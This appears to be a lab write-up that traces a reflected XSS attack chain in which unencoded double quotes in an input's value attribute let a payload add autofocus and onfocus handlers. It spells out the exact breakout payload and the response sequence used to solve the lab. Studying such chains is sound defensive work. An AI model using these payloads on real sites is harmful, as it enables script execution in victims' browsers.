# Attack Chain — Reflected XSS via unencoded quote in input value attribute

## Data flow
```
Attacker crafts URL   /?search=" autofocus onfocus="alert(1)
   │  (single percent-encoding of " and spaces for transport)
   ▼
[INPUT] GET /?search=…  →  server reads `search` param
   │
   ▼
[PROCESSING] server template emits the term twice:
   (a) <h1>0 search results for 'TERM'</h1>          — full entity-encoding
   (b) <input … name=search value="TERM">            — <>-only encoding (" ' raw)
   │
   ▼
[SINK] response HTML contains  value="" autofocus onfocus="alert(1)">
   │  attacker " closes value="" → autofocus + onfocus attributes planted
   │  (no < > needed or usable — both are encoded)
   ▼
[TRUST BOUNDARY CROSSED] victim browser parses response markup; autofocus focuses
the input on load → onfocus fires → alert(1) in app origin, victim context
   ▼
RESULT: zero-click script execution on crafted-URL visit
```

## The exact breakout bytes
- Template: `value="` + TERM + `">`
- TERM = `" autofocus onfocus="alert(1)`
- Rendered: `value="" autofocus onfocus="alert(1)">`
- Roles: 1st `"` (mine) terminates `value`; `autofocus` requests load-time focus;
  2nd `"` (mine) opens the handler; template's `"` closes it; template's `>` closes tag.

## Why this shape and nothing else
- `<script>alert(1)</script>` → `&lt;script&gt;…` in BOTH reflections (proven) — tag
  injection is dead; the lab title states exactly this defense.
- `'` cannot break out: the attribute is double-quoted, so `'` is inert data inside
  the value (structural fact, no test needed).
- `onmouseover`-style handlers would work syntactically but need a hover;
  `autofocus`+`onfocus` fires on load — highest conversion, no interaction.
- Handler must be syntactically complete BEFORE the template's closing `"` (verified
  the hard way: a missing `"` after `onfocus=` folds the template quote into the JS
  and throws).

## Expected response sequence (verified)
1. `GET /?search=<encoded payload>` → 200, reflection planted in `value`.
2. Browser parses, focuses the input (autofocus), handler fires on load.
3. `alert(1)` in app origin → lab acceptance (`is-solved`).